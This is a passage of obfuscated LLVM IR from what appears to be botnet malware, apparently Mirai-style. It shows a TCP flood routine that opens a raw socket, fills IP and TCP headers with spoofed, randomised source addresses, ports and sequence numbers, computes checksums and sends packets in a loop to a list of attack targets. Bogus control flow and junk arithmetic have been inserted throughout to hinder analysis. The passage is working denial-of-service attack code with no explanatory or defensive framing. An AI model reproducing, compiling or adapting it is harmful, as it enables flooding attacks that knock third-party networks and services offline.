  store i8* %336, i8** %37, align 8
  %337 = load i8*, i8** %37, align 8
  %338 = bitcast i8* %337 to i32*
  store i32 0, i32* %338, align 4
  %339 = load i8*, i8** %37, align 8
  %340 = getelementptr inbounds i8, i8* %339, i64 4
  store i8* %340, i8** %37, align 8
  %341 = load i8*, i8** %37, align 8
  %342 = getelementptr inbounds i8, i8* %341, i32 1
  store i8* %342, i8** %37, align 8
  store i8 1, i8* %341, align 1
  %343 = load i8*, i8** %37, align 8
  %344 = getelementptr inbounds i8, i8* %343, i32 1
  store i8* %344, i8** %37, align 8
  store i8 3, i8* %343, align 1
  %345 = load i8*, i8** %37, align 8
  %346 = getelementptr inbounds i8, i8* %345, i32 1
  store i8* %346, i8** %37, align 8
  store i8 3, i8* %345, align 1
  %347 = load i8*, i8** %37, align 8
  %348 = getelementptr inbounds i8, i8* %347, i32 1
  store i8* %348, i8** %37, align 8
  store i8 6, i8* %347, align 1
  br label %349

; <label>:349:                                    ; preds = %224
  %350 = load i32, i32* %17, align 4
  %351 = add nsw i32 %350, 1
  store i32 %351, i32* %17, align 4
  br label %124

; <label>:352:                                    ; preds = %originalBBpart24
  br label %353

; <label>:353:                                    ; preds = %628, %352
  %354 = load i32, i32* @x.25
  %355 = load i32, i32* @y.26
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %353
  store i32 0, i32* %17, align 4
  %362 = load i32, i32* @x.25
  %363 = load i32, i32* @y.26
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %370

; <label>:370:                                    ; preds = %625, %originalBBpart235
  %371 = load i32, i32* @x.25
  %372 = load i32, i32* @y.26
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %370
  %379 = load i32, i32* %17, align 4
  %380 = load i8, i8* %13, align 1
  %381 = zext i8 %380 to i32
  %382 = icmp slt i32 %379, %381
  %383 = load i32, i32* @x.25
  %384 = load i32, i32* @y.26
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %382, label %391, label %628

; <label>:391:                                    ; preds = %originalBBpart239
  %392 = load i8**, i8*** %19, align 8
  %393 = load i32, i32* %17, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds i8*, i8** %392, i64 %394
  %396 = load i8*, i8** %395, align 8
  store i8* %396, i8** %38, align 8
  %397 = load i8*, i8** %38, align 8
  %398 = bitcast i8* %397 to %struct.iphdr*
  store %struct.iphdr* %398, %struct.iphdr** %39, align 8
  %399 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i64 1
  %401 = bitcast %struct.iphdr* %400 to %struct.tcphdr*
  store %struct.tcphdr* %401, %struct.tcphdr** %40, align 8
  %402 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %403 = load i32, i32* %17, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %402, i64 %404
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i32 0, i32 2
  %407 = load i8, i8* %406, align 4
  %408 = zext i8 %407 to i32
  %409 = icmp slt i32 %408, 32
  br i1 %409, label %410, label %431

; <label>:410:                                    ; preds = %391
  %411 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %412 = load i32, i32* %17, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i64 %413
  %415 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i32 0, i32 1
  %416 = load i32, i32* %415, align 4
  %417 = call i32 @ntohl(i32 %416) #7
  %418 = call i32 @rand_next()
  %419 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %420 = load i32, i32* %17, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i32 0, i32 2
  %424 = load i8, i8* %423, align 4
  %425 = zext i8 %424 to i32
  %426 = lshr i32 %418, %425
  %427 = add i32 %417, %426
  %428 = call i32 @htonl(i32 %427) #7
  %429 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 9
  store i32 %428, i32* %430, align 4
  br label %431

; <label>:431:                                    ; preds = %410, %391
  %432 = load i32, i32* @x.25
  %433 = load i32, i32* @y.26
  %434 = sub i32 %432, 1
  %435 = mul i32 %432, %434
  %436 = urem i32 %435, 2
  %437 = icmp eq i32 %436, 0
  %438 = icmp slt i32 %433, 10
  %439 = or i1 %437, %438
  br i1 %439, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %431
  %440 = load i32, i32* %34, align 4
  %441 = icmp eq i32 %440, -1
  %442 = load i32, i32* @x.25
  %443 = load i32, i32* @y.26
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %441, label %450, label %454

; <label>:450:                                    ; preds = %originalBBpart243
  %451 = call i32 @rand_next()
  %452 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 8
  store i32 %451, i32* %453, align 4
  br label %454

; <label>:454:                                    ; preds = %450, %originalBBpart243
  %455 = load i16, i16* %21, align 2
  %456 = zext i16 %455 to i32
  %457 = icmp eq i32 %456, 65535
  br i1 %457, label %458, label %480

; <label>:458:                                    ; preds = %454
  %459 = load i32, i32* @x.25
  %460 = load i32, i32* @y.26
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %458
  %467 = call i32 @rand_next()
  %468 = and i32 %467, 65535
  %469 = trunc i32 %468 to i16
  %470 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 3
  store i16 %469, i16* %471, align 4
  %472 = load i32, i32* @x.25
  %473 = load i32, i32* @y.26
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart252, label %originalBB45alteredBB

originalBBpart252:                                ; preds = %originalBB45
  br label %480

; <label>:480:                                    ; preds = %originalBBpart252, %454
  %481 = load i32, i32* @x.25
  %482 = load i32, i32* @y.26
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %480
  %489 = load i16, i16* %24, align 2
  %490 = zext i16 %489 to i32
  %491 = icmp eq i32 %490, 65535
  %492 = load i32, i32* @x.25
  %493 = load i32, i32* @y.26
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %491, label %500, label %506

; <label>:500:                                    ; preds = %originalBBpart256
  %501 = call i32 @rand_next()
  %502 = and i32 %501, 65535
  %503 = trunc i32 %502 to i16
  %504 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %505 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %504, i32 0, i32 0
  store i16 %503, i16* %505, align 4
  br label %506

; <label>:506:                                    ; preds = %500, %originalBBpart256
  %507 = load i16, i16* %25, align 2
  %508 = zext i16 %507 to i32
  %509 = icmp eq i32 %508, 65535
  br i1 %509, label %510, label %516

; <label>:510:                                    ; preds = %506
  %511 = call i32 @rand_next()
  %512 = and i32 %511, 65535
  %513 = trunc i32 %512 to i16
  %514 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 1
  store i16 %513, i16* %515, align 2
  br label %516

; <label>:516:                                    ; preds = %510, %506
  %517 = load i32, i32* %26, align 4
  %518 = icmp eq i32 %517, 65535
  br i1 %518, label %519, label %523

; <label>:519:                                    ; preds = %516
  %520 = call i32 @rand_next()
  %521 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %522 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %521, i32 0, i32 2
  store i32 %520, i32* %522, align 4
  br label %523

; <label>:523:                                    ; preds = %519, %516
  %524 = load i32, i32* %27, align 4
  %525 = icmp eq i32 %524, 65535
  br i1 %525, label %526, label %546

; <label>:526:                                    ; preds = %523
  %527 = load i32, i32* @x.25
  %528 = load i32, i32* @y.26
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %526
  %535 = call i32 @rand_next()
  %536 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %537 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %536, i32 0, i32 3
  store i32 %535, i32* %537, align 4
  %538 = load i32, i32* @x.25
  %539 = load i32, i32* @y.26
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %546

; <label>:546:                                    ; preds = %originalBBpart260, %523
  %547 = load i8, i8* %28, align 1
  %548 = icmp ne i8 %547, 0
  br i1 %548, label %549, label %571

; <label>:549:                                    ; preds = %546
  %550 = load i32, i32* @x.25
  %551 = load i32, i32* @y.26
  %552 = sub i32 %550, 1
  %553 = mul i32 %550, %552
  %554 = urem i32 %553, 2
  %555 = icmp eq i32 %554, 0
  %556 = icmp slt i32 %551, 10
  %557 = or i1 %555, %556
  br i1 %557, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %549
  %558 = call i32 @rand_next()
  %559 = and i32 %558, 65535
  %560 = trunc i32 %559 to i16
  %561 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %562 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %561, i32 0, i32 7
  store i16 %560, i16* %562, align 2
  %563 = load i32, i32* @x.25
  %564 = load i32, i32* @y.26
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBBpart269, label %originalBB62alteredBB

originalBBpart269:                                ; preds = %originalBB62
  br label %571

; <label>:571:                                    ; preds = %originalBBpart269, %546
  %572 = load i32, i32* @x.25
  %573 = load i32, i32* @y.26
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %571
  %580 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 7
  store i16 0, i16* %581, align 2
  %582 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %583 = bitcast %struct.iphdr* %582 to i16*
  %584 = call zeroext i16 @checksum_generic(i16* %583, i32 20)
  %585 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 7
  store i16 %584, i16* %586, align 2
  %587 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 6
  store i16 0, i16* %588, align 4
  %589 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %590 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %591 = bitcast %struct.tcphdr* %590 to i8*
  %592 = call zeroext i16 @htons(i16 zeroext 40) #7
  %593 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %589, i8* %591, i16 zeroext %592, i32 40)
  %594 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %595 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %594, i32 0, i32 6
  store i16 %593, i16* %595, align 4
  %596 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 1
  %598 = load i16, i16* %597, align 2
  %599 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %600 = load i32, i32* %17, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i64 %601
  %603 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %602, i32 0, i32 0
  %604 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %603, i32 0, i32 1
  store i16 %598, i16* %604, align 2
  %605 = load i32, i32* %18, align 4
  %606 = load i8*, i8** %38, align 8
  %607 = bitcast %union.__CONST_SOCKADDR_ARG* %41 to %struct.sockaddr**
  %608 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %609 = load i32, i32* %17, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i64 %610
  %612 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %611, i32 0, i32 0
  %613 = bitcast %struct.sockaddr_in* %612 to %struct.sockaddr*
  store %struct.sockaddr* %613, %struct.sockaddr** %607, align 8
  %614 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %41, i32 0, i32 0
  %615 = load %struct.sockaddr*, %struct.sockaddr** %614, align 8
  %616 = call i64 @sendto(i32 %605, i8* %606, i64 60, i32 16384, %struct.sockaddr* %615, i32 16)
  %617 = load i32, i32* @x.25
  %618 = load i32, i32* @y.26
  %619 = sub i32 %617, 1
  %620 = mul i32 %617, %619
  %621 = urem i32 %620, 2
  %622 = icmp eq i32 %621, 0
  %623 = icmp slt i32 %618, 10
  %624 = or i1 %622, %623
  br i1 %624, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %625

; <label>:625:                                    ; preds = %originalBBpart273
  %626 = load i32, i32* %17, align 4
  %627 = add nsw i32 %626, 1
  store i32 %627, i32* %17, align 4
  br label %370

; <label>:628:                                    ; preds = %originalBBpart239
  br label %353

; <label>:629:                                    ; preds = %120, %114
  %630 = load i32, i32* @x.25
  %631 = load i32, i32* @y.26
  %632 = sub i32 %630, 1
  %633 = mul i32 %630, %632
  %634 = urem i32 %633, 2
  %635 = icmp eq i32 %634, 0
  %636 = icmp slt i32 %631, 10
  %637 = or i1 %635, %636
  br i1 %637, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %629
  %638 = load i32, i32* @x.25
  %639 = load i32, i32* @y.26
  %640 = sub i32 %638, 1
  %641 = mul i32 %638, %640
  %642 = urem i32 %641, 2
  %643 = icmp eq i32 %642, 0
  %644 = icmp slt i32 %639, 10
  %645 = or i1 %643, %644
  br i1 %645, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %646 = alloca i8, align 1
  %647 = alloca %struct.attack_target*, align 8
  %648 = alloca i8, align 1
  %649 = alloca %struct.attack_option*, align 8
  %650 = alloca i32, align 4
  %651 = alloca i32, align 4
  %652 = alloca i8**, align 8
  %653 = alloca i8, align 1
  %654 = alloca i16, align 2
  %655 = alloca i8, align 1
  %656 = alloca i8, align 1
  %657 = alloca i16, align 2
  %658 = alloca i16, align 2
  %659 = alloca i32, align 4
  %660 = alloca i32, align 4
  %661 = alloca i8, align 1
  %662 = alloca i8, align 1
  %663 = alloca i8, align 1
  %664 = alloca i8, align 1
  %665 = alloca i8, align 1
  %666 = alloca i8, align 1
  %667 = alloca i32, align 4
  %668 = alloca %struct.iphdr*, align 8
  %669 = alloca %struct.tcphdr*, align 8
  %670 = alloca i8*, align 8
  %671 = alloca i8*, align 8
  %672 = alloca %struct.iphdr*, align 8
  %673 = alloca %struct.tcphdr*, align 8
  %674 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %646, align 1
  store %struct.attack_target* %1, %struct.attack_target** %647, align 8
  store i8 %2, i8* %648, align 1
  store %struct.attack_option* %3, %struct.attack_option** %649, align 8
  %675 = load i8, i8* %646, align 1
  %676 = zext i8 %675 to i64
  %677 = call noalias i8* @calloc(i64 %676, i64 8) #6
  %678 = bitcast i8* %677 to i8**
  store i8** %678, i8*** %652, align 8
  %679 = load i8, i8* %648, align 1
  %680 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %681 = call i32 @attack_get_opt_int(i8 zeroext %679, %struct.attack_option* %680, i8 zeroext 2, i32 0)
  %682 = trunc i32 %681 to i8
  store i8 %682, i8* %653, align 1
  %683 = load i8, i8* %648, align 1
  %684 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %685 = call i32 @attack_get_opt_int(i8 zeroext %683, %struct.attack_option* %684, i8 zeroext 3, i32 65535)
  %686 = trunc i32 %685 to i16
  store i16 %686, i16* %654, align 2
  %687 = load i8, i8* %648, align 1
  %688 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %689 = call i32 @attack_get_opt_int(i8 zeroext %687, %struct.attack_option* %688, i8 zeroext 4, i32 64)
  %690 = trunc i32 %689 to i8
  store i8 %690, i8* %655, align 1
  %691 = load i8, i8* %648, align 1
  %692 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %693 = call i32 @attack_get_opt_int(i8 zeroext %691, %struct.attack_option* %692, i8 zeroext 5, i32 1)
  %694 = trunc i32 %693 to i8
  store i8 %694, i8* %656, align 1
  %695 = load i8, i8* %648, align 1
  %696 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %697 = call i32 @attack_get_opt_int(i8 zeroext %695, %struct.attack_option* %696, i8 zeroext 6, i32 65535)
  %698 = trunc i32 %697 to i16
  store i16 %698, i16* %657, align 2
  %699 = load i8, i8* %648, align 1
  %700 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %701 = call i32 @attack_get_opt_int(i8 zeroext %699, %struct.attack_option* %700, i8 zeroext 7, i32 65535)
  %702 = trunc i32 %701 to i16
  store i16 %702, i16* %658, align 2
  %703 = load i8, i8* %648, align 1
  %704 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %705 = call i32 @attack_get_opt_int(i8 zeroext %703, %struct.attack_option* %704, i8 zeroext 17, i32 65535)
  store i32 %705, i32* %659, align 4
  %706 = load i8, i8* %648, align 1
  %707 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %708 = call i32 @attack_get_opt_int(i8 zeroext %706, %struct.attack_option* %707, i8 zeroext 18, i32 0)
  store i32 %708, i32* %660, align 4
  %709 = load i8, i8* %648, align 1
  %710 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %711 = call i32 @attack_get_opt_int(i8 zeroext %709, %struct.attack_option* %710, i8 zeroext 11, i32 0)
  %712 = trunc i32 %711 to i8
  store i8 %712, i8* %661, align 1
  %713 = load i8, i8* %648, align 1
  %714 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %715 = call i32 @attack_get_opt_int(i8 zeroext %713, %struct.attack_option* %714, i8 zeroext 12, i32 0)
  %716 = trunc i32 %715 to i8
  store i8 %716, i8* %662, align 1
  %717 = load i8, i8* %648, align 1
  %718 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %719 = call i32 @attack_get_opt_int(i8 zeroext %717, %struct.attack_option* %718, i8 zeroext 13, i32 0)
  %720 = trunc i32 %719 to i8
  store i8 %720, i8* %663, align 1
  %721 = load i8, i8* %648, align 1
  %722 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %723 = call i32 @attack_get_opt_int(i8 zeroext %721, %struct.attack_option* %722, i8 zeroext 14, i32 0)
  %724 = trunc i32 %723 to i8
  store i8 %724, i8* %664, align 1
  %725 = load i8, i8* %648, align 1
  %726 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %727 = call i32 @attack_get_opt_int(i8 zeroext %725, %struct.attack_option* %726, i8 zeroext 15, i32 1)
  %728 = trunc i32 %727 to i8
  store i8 %728, i8* %665, align 1
  %729 = load i8, i8* %648, align 1
  %730 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %731 = call i32 @attack_get_opt_int(i8 zeroext %729, %struct.attack_option* %730, i8 zeroext 16, i32 0)
  %732 = trunc i32 %731 to i8
  store i8 %732, i8* %666, align 1
  %733 = load i8, i8* %648, align 1
  %734 = load %struct.attack_option*, %struct.attack_option** %649, align 8
  %735 = load i32, i32* @LOCAL_ADDR, align 4
  %736 = call i32 @attack_get_opt_ip(i8 zeroext %733, %struct.attack_option* %734, i8 zeroext 25, i32 %735)
  store i32 %736, i32* %667, align 4
  %737 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %737, i32* %651, align 4
  %738 = icmp eq i32 %737, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %124
  %739 = load i32, i32* %17, align 4
  %740 = load i8, i8* %13, align 1
  %741 = zext i8 %740 to i32
  %742 = icmp slt i32 %739, %741
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %145
  %743 = call noalias i8* @calloc(i64 128, i64 1) #6
  %744 = load i8**, i8*** %19, align 8
  %745 = load i32, i32* %17, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds i8*, i8** %744, i64 %746
  store i8* %743, i8** %747, align 8
  %748 = load i8**, i8*** %19, align 8
  %749 = load i32, i32* %17, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds i8*, i8** %748, i64 %750
  %752 = load i8*, i8** %751, align 8
  %753 = bitcast i8* %752 to %struct.iphdr*
  store %struct.iphdr* %753, %struct.iphdr** %35, align 8
  %754 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %755 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %754, i64 1
  %756 = bitcast %struct.iphdr* %755 to %struct.tcphdr*
  store %struct.tcphdr* %756, %struct.tcphdr** %36, align 8
  %757 = load %struct.tcphdr*, %struct.tcphdr** %36, align 8
  %758 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %757, i64 1
  %759 = bitcast %struct.tcphdr* %758 to i8*
  store i8* %759, i8** %37, align 8
  %760 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %761 = bitcast %struct.iphdr* %760 to i8*
  %762 = load i8, i8* %761, align 4
  %_ = shl i8 %762, 15
  %763 = and i8 %762, 15
  %_7 = shl i8 %763, 64
  %764 = or i8 %763, 64
  store i8 %764, i8* %761, align 4
  %765 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %766 = bitcast %struct.iphdr* %765 to i8*
  %767 = load i8, i8* %766, align 4
  %_8 = sub i8 0, %767
  %gen = add i8 %_8, -16
  %_9 = shl i8 %767, -16
  %_10 = sub i8 %767, -16
  %gen11 = mul i8 %_10, -16
  %_12 = sub i8 0, %767
  %gen13 = add i8 %_12, -16
  %_14 = sub i8 0, %767
  %gen15 = add i8 %_14, -16
  %768 = and i8 %767, -16
  %_16 = sub i8 0, %768
  %gen17 = add i8 %_16, 5
  %_18 = shl i8 %768, 5
  %_19 = sub i8 0, %768
  %gen20 = add i8 %_19, 5
  %_21 = sub i8 0, %768
  %gen22 = add i8 %_21, 5
  %_23 = shl i8 %768, 5
  %_24 = sub i8 %768, 5
  %gen25 = mul i8 %_24, 5
  %769 = or i8 %768, 5
  store i8 %769, i8* %766, align 4
  %770 = load i8, i8* %20, align 1
  %771 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %772 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %771, i32 0, i32 1
  store i8 %770, i8* %772, align 1
  %773 = call zeroext i16 @htons(i16 zeroext 60) #7
  %774 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %775 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %774, i32 0, i32 2
  store i16 %773, i16* %775, align 2
  %776 = load i16, i16* %21, align 2
  %777 = call zeroext i16 @htons(i16 zeroext %776) #7
  %778 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %779 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %778, i32 0, i32 3
  store i16 %777, i16* %779, align 4
  %780 = load i8, i8* %22, align 1
  %781 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %782 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %781, i32 0, i32 5
  store i8 %780, i8* %782, align 4
  %783 = load i8, i8* %23, align 1
  %784 = icmp ne i8 %783, 0
  br label %originalBB6

originalBB29alteredBB:                            ; preds = %originalBB29, %204
  %785 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %786 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %787 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %786, i32 0, i32 4
  store i16 %785, i16* %787, align 2
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %353
  store i32 0, i32* %17, align 4
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %370
  %788 = load i32, i32* %17, align 4
  %789 = load i8, i8* %13, align 1
  %790 = zext i8 %789 to i32
  %791 = icmp slt i32 %788, %790
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %431
  %792 = load i32, i32* %34, align 4
  %793 = icmp eq i32 %792, -1
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %458
  %794 = call i32 @rand_next()
  %_46 = sub i32 0, %794
  %gen47 = add i32 %_46, 65535
  %_48 = sub i32 %794, 65535
  %gen49 = mul i32 %_48, 65535
  %_50 = shl i32 %794, 65535
  %795 = and i32 %794, 65535
  %796 = trunc i32 %795 to i16
  %797 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %798 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %797, i32 0, i32 3
  store i16 %796, i16* %798, align 4
  br label %originalBB45

originalBB54alteredBB:                            ; preds = %originalBB54, %480
  %799 = load i16, i16* %24, align 2
  %800 = zext i16 %799 to i32
  %801 = icmp eq i32 %800, 65535
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %526
  %802 = call i32 @rand_next()
  %803 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %804 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %803, i32 0, i32 3
  store i32 %802, i32* %804, align 4
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %549
  %805 = call i32 @rand_next()
  %_63 = sub i32 0, %805
  %gen64 = add i32 %_63, 65535
  %_65 = shl i32 %805, 65535
  %_66 = sub i32 0, %805
  %gen67 = add i32 %_66, 65535
  %806 = and i32 %805, 65535
  %807 = trunc i32 %806 to i16
  %808 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %809 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %808, i32 0, i32 7
  store i16 %807, i16* %809, align 2
  br label %originalBB62

originalBB71alteredBB:                            ; preds = %originalBB71, %571
  %810 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %811 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %810, i32 0, i32 7
  store i16 0, i16* %811, align 2
  %812 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %813 = bitcast %struct.iphdr* %812 to i16*
  %814 = call zeroext i16 @checksum_generic(i16* %813, i32 20)
  %815 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %816 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %815, i32 0, i32 7
  store i16 %814, i16* %816, align 2
